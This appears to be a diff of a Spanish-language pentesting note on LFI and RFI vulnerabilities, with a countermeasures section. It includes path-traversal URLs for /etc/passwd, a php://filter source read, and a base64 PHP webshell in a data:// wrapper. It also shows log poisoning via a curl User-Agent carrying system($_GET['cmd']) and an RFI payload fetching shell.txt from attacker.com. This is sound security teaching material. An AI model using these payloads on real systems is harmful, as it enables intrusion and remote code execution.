@@ -1,47 +1,53 @@
-# Análisis de Vulnerabilidades: Local File Inclusion (LFI) & Remote File Inclusion (RFI)
+# Análisis de Vulnerabilidades: LFI y RFI
 
 ## Descripción
-Las vulnerabilidades de inclusión de archivos ocurren cuando una aplicación web permite que un usuario controle la ruta de un archivo que se incluye o carga en el servidor. El Local File Inclusion (LFI) permite leer archivos sensibles locales del servidor (como `/etc/passwd`), mientras que el Remote File Inclusion (RFI) permite incluir archivos externos, lo que puede llevar a la ejecución remota de código (RCE).
+La inclusión de archivos (File Inclusion) permite a un atacante incluir archivos locales (LFI) o remotos (RFI) en el contexto de ejecución de la aplicación. Según *The Web Application Hacker's Handbook*, estas fallas suelen ser precursores directos de la Ejecución Remota de Comandos (RCE). El LFI ocurre cuando la entrada del usuario se usa para construir rutas de archivos; el RFI, cuando la aplicación permite incluir scripts desde servidores externos.
 
 ## Clasificación
 - **Fase**: Análisis de Vulnerabilidades
-- **MITRE ATT&CK**: T1190 (Exploit Public-Facing Application)
-- **Plataforma**: Web
-- **Dificultad**: Intermedia
+- **MITRE ATT&CK**: [T1190](https://attack.mitre.org/techniques/T1190/) (Exploit Public-Facing Application)
+- **Plataforma**: Web / Multi
+- **Dificultad**: Intermedia a Avanzada (Log Poisoning)
 
 ## Herramientas
-- **Burp Suite** (Intruder) — Automatización de envío de payloads para la detección de inclusión de archivos.
-- **ffuf** — Fuzzer de línea de comandos rápido para descubrir parámetros vulnerables a LFI/RFI.
-- **SecLists** — Repositorio de payloads especializados para la detección de vulnerabilidades de inclusión.
-- **Navegador** — Utilizado para la validación manual de la carga y ejecución de archivos.
+- **Burp Suite (Intruder)** — Fuzzing de rutas sistemático con SecLists.
+- **FFUF** — Identificación rápida de parámetros vulnerables.
+- **fimap** — Herramienta especializada en la detección y explotación de File Inclusion.
 
 ## Comandos / Ejemplos
-Fuzzing básico de LFI con `ffuf` y SecLists:
+
+### 1. LFI Básico y Path Traversal
+Lectura de archivos sensibles del sistema:
 ```bash
-ffuf -u http://target.com/index.php?page=FUZZ -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mr "root:x:0:0"
+# Linux
+http://target.com/view?page=../../../../etc/passwd
+# Windows
+http://target.com/view?page=../../../../windows/system32/drivers/etc/hosts
 ```
 
-Prueba manual de LFI (Linux):
-```
-http://target.com/view.php?file=../../../../etc/passwd
-```
+### 2. Uso de PHP Wrappers (Técnicas Avanzadas)
+Cuando el código de la página se procesa pero no se muestra, se puede usar `base64` para leerlo:
+- **Lectura de código fuente (PHP)**: `php://filter/convert.base64-encode/resource=config.php`
+- **Inyección de código (Data wrapper)**: `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+&cmd=id` (Requiere `allow_url_include=On`).
 
-Prueba manual de LFI con filtros de PHP (Base64):
-```
-http://target.com/view.php?file=php://filter/convert.base64-encode/resource=config.php
-```
+### 3. Log Poisoning (De LFI a RCE)
+Si el atacante puede leer los logs del servidor (ej. Apache `/var/log/apache2/access.log`), puede inyectar código PHP en el `User-Agent` de una petición previa:
+1. **Inyección**: `curl -A "<?php system($_GET['cmd']); ?>" http://target.com/`
+2. **Explotación**: `http://target.com/view?page=../../../../var/log/apache2/access.log&cmd=id`
 
-Prueba manual de RFI:
-```
-http://target.com/view.php?file=http://attacker.com/shell.txt
-```
+### 4. Remote File Inclusion (RFI)
+Ejecución de un script malicioso alojado externamente:
+- **Payload**: `http://target.com/view?page=http://attacker.com/shell.txt`
+*Nota: Requiere `allow_url_include=On` en php.ini.*
 
 ## Contramedidas
-- Implementar una lista blanca (Whitelisting) de archivos permitidos para inclusión.
-- Deshabilitar `allow_url_include` en la configuración de PHP (`php.ini`).
-- Utilizar funciones de sistema de archivos que no permitan el acceso directo a rutas dinámicas.
-- Validar rigurosamente las entradas del usuario y evitar el uso de rutas relativas.
+- **Deshabilitar Funciones Peligrosas**: Configurar `allow_url_include=Off` y `allow_url_fopen=Off`.
+- **Listas Blancas**: Usar solo nombres de archivos permitidos o IDs en lugar de rutas dinámicas.
+- **Validación de Rutas**: Normalizar las rutas y verificar que el archivo final esté dentro del directorio base esperado.
+- **Principio de Mínimo Privilegio**: El servidor web no debe tener permisos de lectura en `/var/log/` ni archivos críticos del sistema.
 
 ## Referencias
-- Harper, A., et al. (2018). *Gray Hat Hacking: The Ethical Hacker's Handbook*. McGraw-Hill Education.
-- Kim, P. (2018). *The Hacker Playbook 3: Practical Guide To Penetration Testing*. Secure Planet, LLC.
+- Stuttard, D., & Pinto, M. (2011). *The Web Application Hacker's Handbook: Finding and Exploiting Security Flaws* (2nd ed.). Wiley.
+- Rahalkar, S. (2017). *Metasploit Penetration Testing Cookbook* (3rd ed.). Packt Publishing.
+- Notas del proyecto: notas-md/HNotes/HNotes/Hacking/File Inclusion.md
+- MITRE Corporation. (2024). ATT&CK Technique T1190: Exploit Public-Facing Application. https://attack.mitre.org/techniques/T1190/
